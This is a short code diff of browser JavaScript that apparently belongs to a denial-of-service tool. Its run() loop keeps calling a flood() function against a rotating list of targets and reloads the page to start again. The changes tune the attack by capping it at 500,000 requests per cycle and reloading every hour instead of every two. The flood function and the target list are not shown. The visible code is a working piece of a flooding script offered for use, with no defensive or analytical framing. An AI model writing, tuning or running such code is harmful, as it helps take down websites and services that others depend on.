@@ -57,12 +57,12 @@ setTimeout(() => {
   }
 
   function run() {
-    if (id === 2000000) {
+    if (id === 500000) {
       setTimeout(() => location.href = '?'+Date.now(), 5000)
     } else {
       id++;
 
-      if (id < 2000000) {
+      if (id < 500000) {
         flood(targets[id % targets.length], id).finally(run)
       }
     }
@@ -72,6 +72,6 @@ setTimeout(() => {
     run();
   }
 
-  setTimeout(() => location.href = '?'+Date.now(), 2 * 60 * 60 * 1000)
+  setTimeout(() => location.href = '?'+Date.now(), 60 * 60 * 1000)
 }, 1000)
 
